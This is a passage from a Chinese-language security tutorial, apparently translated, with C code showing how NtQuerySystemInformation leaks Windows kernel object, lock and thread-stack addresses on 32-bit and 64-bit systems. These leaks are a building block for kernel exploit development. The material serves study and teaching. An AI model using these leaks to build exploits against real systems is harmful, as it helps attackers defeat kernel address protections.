}&nbsp;SYSTEM_HANDLE_INFORMATION_EX,&nbsp;*PSYSTEM_HANDLE_INFORMATION_EX;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">正如您看到的，输出结构包含每个对象的HandleValue和Object字段，它是一个指向对象在内存中的位置的指针。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;struct&nbsp;_SYSTEM_HANDLE
{
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;Object;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;UniqueProcessId;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;HandleValue;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;GrantedAccess;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;CreatorBackTraceIndex;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;ObjectTypeIndex;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;HandleAttributes;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Reserved;
}&nbsp;SYSTEM_HANDLE,&nbsp;*PSYSTEM_HANDLE;
&nbsp;
typedef&nbsp;struct&nbsp;_SYSTEM_HANDLE_INFORMATION_EX
{
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;HandleCount;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;Reserved;
&nbsp;&nbsp;&nbsp;&nbsp;SYSTEM_HANDLE&nbsp;Handles[1];
}&nbsp;SYSTEM_HANDLE_INFORMATION_EX,&nbsp;*PSYSTEM_HANDLE_INFORMATION_EX;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了使用这个SystemInformationClass值，NtQuerySystemInformation提供了一个奇怪的API，当使用NULL指针调用它时，它不是返回所需的内存，而只是返回NTSTATUS代码0xC0000004。 这是STATUS_INFO_LENGTH_MISMATCH的代码，当为待写入的输出分配的内存不足时，就会返回该代码。为了处理这个问题，我为输出分配了很少的内存，然后不断调用NtQuerySystemInformation，每次将内存量加倍，直到它返回一个不同的状态代码为止。</span></p><pre class="brush:bash;toolbar:false">ULONG&nbsp;len&nbsp;=&nbsp;20;
NTSTATUS&nbsp;status&nbsp;=&nbsp;(NTSTATUS)0xc0000004;
PSYSTEM_HANDLE_INFORMATION_EX&nbsp;pHandleInfo&nbsp;=&nbsp;NULL;
do&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;*=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;pHandleInfo&nbsp;=&nbsp;(PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT,&nbsp;len);
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;=&nbsp;query(SystemExtendedHandleInformation,&nbsp;pHandleInfo,&nbsp;len,&nbsp;&amp;len);
&nbsp;
}&nbsp;while&nbsp;(status&nbsp;==&nbsp;(NTSTATUS)&nbsp;0xc0000004);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一旦分配了足够的内存，该函数就会成功返回，然后我们就可以像前面介绍的那样来遍历输出，并打印我们感兴趣的值了。</span></p><pre class="brush:bash;toolbar:false">for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pHandleInfo-&gt;HandleCount;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;object&nbsp;=&nbsp;pHandleInfo-&gt;Handles[i].Object;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;handle&nbsp;=&nbsp;pHandleInfo-&gt;Handles[i].HandleValue;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;pid&nbsp;=&nbsp;pHandleInfo-&gt;Handles[i].UniqueProcessId;
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;PID:&nbsp;%d\t&quot;,&nbsp;pid);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Object&nbsp;0x%X\t&quot;,&nbsp;object);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Handle&nbsp;0x%X\r\n&quot;,&nbsp;handle);
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">构建并运行上述代码，我们将得到以下输出结果。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01e4fadea7bbf69058.png" title="t011d9a8bcc3ecd1649.png" alt="http://p3.qhimg.com/t011d9a8bcc3ecd1649.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个例子的完整代码（包括后面在64位Windows上运行的相应版本）可以从Github上面下载。 </span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">SystemLockInformation</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在j00ru的论文中考察的第三个SystemInformationClass值是SystemLockInformation，它返回当前存在于内核内存中的每个Lock对象的详细信息和地址。 同样的，我们首先要定义正确的SYSTEM_INFORMATION_CLASS值。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;enum&nbsp;_SYSTEM_INFORMATION_CLASS&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;SystemLockInformation&nbsp;=&nbsp;12
}&nbsp;SYSTEM_INFORMATION_CLASS;</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来，我们需要定义输出结构，为此，我引用了j00ru的文件中的结构定义，并假设提供LocksCount信息的容器结构也采用其他结构的模式。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;struct&nbsp;_SYSTEM_LOCK&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;Address;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;&nbsp;Type;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;&nbsp;Reserved1;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;ExclusiveOwnerThreadId;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;ActiveCount;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;ContentionCount;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;Reserved2[2];
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;NumberOfSharedWaiters;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;NumberOfExclusiveWaiters;
}&nbsp;SYSTEM_LOCK,&nbsp;*PSYSTEM_LOCK;
&nbsp;
typedef&nbsp;struct&nbsp;SYSTEM_LOCK_INFORMATION&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LocksCount;
&nbsp;&nbsp;&nbsp;&nbsp;SYSTEM_LOCK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Locks[1];
}&nbsp;SYSTEM_LOCK_INFORMATION,&nbsp;*PSYSTEM_LOCK_INFORMATION;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在SYSTEM_LOCK结构中，需要注意的关键值是Address字段，它是指向内核内存中的对象的指针。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">就像SystemExtendedHandleInformation的用法那样，无法直接让NtQuerySystemInformation提供我们所需的输出缓冲区大小，我们需要在一个循环中调用它，直至给出长度不匹配错误代码为止。</span></p><pre class="brush:bash;toolbar:false">PSYSTEM_LOCK_INFORMATION&nbsp;pLockInfo&nbsp;=&nbsp;NULL;
ULONG&nbsp;len&nbsp;=&nbsp;20;
NTSTATUS&nbsp;status&nbsp;=&nbsp;(NTSTATUS)0xc0000004;
&nbsp;
do&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;*=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;pLockInfo&nbsp;=&nbsp;(PSYSTEM_LOCK_INFORMATION)GlobalAlloc(GMEM_ZEROINIT,&nbsp;len);
&nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;=&nbsp;query(SystemLockInformation,&nbsp;pLockInfo,&nbsp;len,&nbsp;&amp;len);
}&nbsp;while&nbsp;(status&nbsp;==&nbsp;(NTSTATUS)0xc0000004);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一旦分配了足够的内存，该函数就会成功返回，然后我们就可以像前面介绍的那样来遍历输出，并打印我们感兴趣的值了。</span></p><pre class="brush:bash;toolbar:false">for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pLockInfo-&gt;LocksCount;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;lockAddress&nbsp;=&nbsp;pLockInfo-&gt;Locks[i].Address;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;lockType&nbsp;=&nbsp;(USHORT)pLockInfo-&gt;Locks[i].Type;
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Lock&nbsp;Address&nbsp;0x%X\t&quot;,&nbsp;lockAddress);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Lock&nbsp;Type&nbsp;0x%X\r\n&quot;,&nbsp;lockType);
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">它可以在32位Windows 7 上成功运行：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t0137a7341c5889798f.png" title="t0191a88d6e23cfcfa8.png" alt="http://p7.qhimg.com/t0191a88d6e23cfcfa8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完整代码，包括64位Windows的相应版本，可以从Github下载。 </span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">SystemExtendedProcessInformation</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在j00ru的论文中提到的最后一个SystemInformationClass值是SystemExtendedProcessInformation，它返回在系统中运行的所有进程和线程的详细信息，包括每个线程用户和内核模式堆栈的地址。 首先，我们需要定义正确的SYSTEM_INFORMATION_CLASS值。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;enum&nbsp;_SYSTEM_INFORMATION_CLASS&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;SystemSessionProcessInformation&nbsp;=&nbsp;57
}&nbsp;SYSTEM_INFORMATION_CLASS;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来，我们需要定义所有的输出结构，这些结构取自伯克利的BOINC项目。借助于逆向工程，人们已经对该结构有了全面的了解，所以我们不妨使用完整的结构定义。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p><br/></p><pre class="brush:bash;toolbar:false">typedef&nbsp;LONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KPRIORITY;
typedef&nbsp;struct&nbsp;_CLIENT_ID&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UniqueProcess;
&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UniqueThread;
}&nbsp;CLIENT_ID;
&nbsp;
typedef&nbsp;struct&nbsp;_UNICODE_STRING&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MaximumLength;
&nbsp;&nbsp;&nbsp;&nbsp;PWSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Buffer;
}&nbsp;UNICODE_STRING;
&nbsp;
typedef&nbsp;struct&nbsp;_VM_COUNTERS&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PeakVirtualSize;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualSize;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PageFaultCount;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PeakWorkingSetSize;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WorkingSetSize;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;QuotaPeakPagedPoolUsage;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;QuotaPagedPoolUsage;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;QuotaPeakNonPagedPoolUsage;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;QuotaNonPagedPoolUsage;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PagefileUsage;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PeakPagefileUsage;
}&nbsp;VM_COUNTERS;
&nbsp;
typedef&nbsp;enum&nbsp;_KWAIT_REASON
{
&nbsp;&nbsp;&nbsp;&nbsp;Executive&nbsp;=&nbsp;0,
&nbsp;&nbsp;&nbsp;&nbsp;FreePage&nbsp;=&nbsp;1,
&nbsp;&nbsp;&nbsp;&nbsp;PageIn&nbsp;=&nbsp;2,
&nbsp;&nbsp;&nbsp;&nbsp;PoolAllocation&nbsp;=&nbsp;3,
//SNIP
&nbsp;&nbsp;&nbsp;&nbsp;WrRundown&nbsp;=&nbsp;36,
&nbsp;&nbsp;&nbsp;&nbsp;MaximumWaitReason&nbsp;=&nbsp;37
}&nbsp;KWAIT_REASON;
&nbsp;
typedef&nbsp;struct&nbsp;_SYSTEM_THREAD_INFORMATION{
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;KernelTime;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;UserTime;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;CreateTime;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;WaitTime;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;StartAddress;
&nbsp;&nbsp;&nbsp;&nbsp;CLIENT_ID&nbsp;ClientId;
&nbsp;&nbsp;&nbsp;&nbsp;KPRIORITY&nbsp;Priority;
&nbsp;&nbsp;&nbsp;&nbsp;LONG&nbsp;BasePriority;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ContextSwitches;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ThreadState;
&nbsp;&nbsp;&nbsp;&nbsp;KWAIT_REASON&nbsp;WaitReason;
}&nbsp;SYSTEM_THREAD_INFORMATION,&nbsp;*PSYSTEM_THREAD_INFORMATION;
&nbsp;
typedef&nbsp;struct&nbsp;_SYSTEM_EXTENDED_THREAD_INFORMATION
{
&nbsp;&nbsp;&nbsp;&nbsp;SYSTEM_THREAD_INFORMATION&nbsp;ThreadInfo;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;StackBase;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;StackLimit;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;Win32StartAddress;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;TebAddress;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Reserved1;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Reserved2;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Reserved3;
}&nbsp;SYSTEM_EXTENDED_THREAD_INFORMATION,&nbsp;*
PSYSTEM_EXTENDED_THREAD_INFORMATION;
&nbsp;
typedef&nbsp;struct&nbsp;_SYSTEM_EXTENDED_PROCESS_INFORMATION
{
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;NextEntryOffset;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;NumberOfThreads;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;SpareLi1;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;SpareLi2;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;SpareLi3;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;CreateTime;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;UserTime;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;KernelTime;
&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;ImageName;
&nbsp;&nbsp;&nbsp;&nbsp;KPRIORITY&nbsp;BasePriority;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;UniqueProcessId;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;InheritedFromUniqueProcessId;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;HandleCount;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;SessionId;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;PageDirectoryBase;
&nbsp;&nbsp;&nbsp;&nbsp;VM_COUNTERS&nbsp;VirtualMemoryCounters;
&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;PrivatePageCount;
&nbsp;&nbsp;&nbsp;&nbsp;IO_COUNTERS&nbsp;IoCounters;
&nbsp;&nbsp;&nbsp;&nbsp;SYSTEM_EXTENDED_THREAD_INFORMATION&nbsp;Threads[1];
}&nbsp;SYSTEM_EXTENDED_PROCESS_INFORMATION,&nbsp;*PSYSTEM_EXTENDED_PROCESS_INFORMATION;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在这些结构中，我们感兴趣的关键值是StackBase和StackLimit字段，它们提供了线程内核模式堆栈的起始地址及其边界。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">再次重申，NtQuerySystemInformation不会告诉我们需要分配多少内存，所以我们需要利用循环来调用它。</span></p><p><br/></p><pre class="brush:bash;toolbar:false">ULONG&nbsp;len&nbsp;=&nbsp;20;
NTSTATUS&nbsp;status&nbsp;=&nbsp;NULL;
PSYSTEM_EXTENDED_PROCESS_INFORMATION&nbsp;pProcessInfo&nbsp;=&nbsp;NULL;
do&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;*=&nbsp;2;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pProcessInfo&nbsp;=&nbsp;(PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT,&nbsp;len);
&nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;=&nbsp;query(SystemSessionProcessInformation,&nbsp;pProcessInfo,&nbsp;len,&nbsp;&amp;len);
}&nbsp;while&nbsp;(status&nbsp;==&nbsp;(NTSTATUS)0xc0000004);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一旦函数成功调用，我们就可以为系统上运行的每个线程打印出相应的StackBase和StackLimit值了。为此，我们需要遍历所有的ProcessInfo结构，然后遍历其中的每个线程，并打印我们感兴趣的值。</span></p><pre class="brush:bash;toolbar:false">while&nbsp;(pProcessInfo-&gt;NextEntryOffset&nbsp;!=&nbsp;NULL)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(unsigned&nbsp;int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pProcessInfo-&gt;NumberOfThreads;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;stackBase&nbsp;=&nbsp;pProcessInfo-&gt;Threads[i].StackBase;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;stackLimit&nbsp;=&nbsp;pProcessInfo-&gt;Threads[i].StackLimit;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Stack&nbsp;base&nbsp;0x%X\t&quot;,&nbsp;stackBase);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Stack&nbsp;limit&nbsp;0x%X\r\n&quot;,&nbsp;stackLimit);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;pProcessInfo&nbsp;=&nbsp;(PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo&nbsp;+&nbsp;pProcessInfo-&gt;NextEntryOffset);
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">下面是它在32位Windows 7上面的运行结果：</span></p><p style="text-align: center; text-indent: 2em;"><img src="http://p9.qhimg.com/t013a306d6eb5e040e3.png" title="t01d1c90fb0164741a8.png" alt="http://p5.qhimg.com/t01d1c90fb0164741a8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个示例的完整代码（包括用于64位系统的相应版本）可以在Github上找到。 </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 8 64 bit</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">所有这些代码，要想用于64位Windows 8上，都需要稍作修改。当然，具体需要做出怎样的修改，则需要借助于调试代码本身来完成。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">SystemModuleInformation</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">只有两处需要稍作修改，首先位于system_module结构之后的ImageBaseAddress指针是32位的，所以需要加入一个填充变量，至于填充的额外32位所包含的内容则是无所谓的。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;struct&nbsp;SYSTEM_MODULE&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reserved1;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reserved2;
#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reserved3;
#endif
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ImageBaseAddress;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">此外，一旦NtQuerySystemInformation被调用，用于打印基地址的printf语句需要进行相应的更新，以便打印64位指针。</span></p><pre class="brush:bash;toolbar:false">&nbsp;printf(&quot;Base&nbsp;Addr&nbsp;0x%llx\r\n&quot;,&nbsp;kernelImageBase);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">编译之后，就可以成功运行在64位Windows 8上面了：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01152ab4826e6b0022.png" title="t01fb9699f5ed197ca5.png" alt="http://p1.qhimg.com/t01fb9699f5ed197ca5.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此外，编译后的代码也可以从Github上下载。 </span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">SystemHandleInformation</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对于SystemHandleInformation来说，只需要改动print语句，其他一切正常。</span></p><pre class="brush:bash;toolbar:false">#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Object&nbsp;0x%llx\t&quot;,&nbsp;object);
#else
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Object&nbsp;0x%X\t&quot;,&nbsp;object);
#endif</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在64位Windows 8上的运行结果：</span></p><p style="text-align: center; text-indent: 2em;"><img src="http://p3.qhimg.com/t01d49dd5d8c51c0c8b.png" title="t0116324302a88da159.png" alt="http://p7.qhimg.com/t0116324302a88da159.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最终的代码也可以从Github上下载。 </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SystemLockInformation</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了让SystemLockInformation可用于64位Windows，必须添加另一个填充变量，当我测试时，这个变量里面好像没有任何东西，不过，也可能还有其他用途，只是我没有注意到罢了。字段大小不会相加，因为还要考虑对齐问题。</span></p><pre class="brush:bash;toolbar:false">&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;Reserved2[2];
#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;Reserved3;
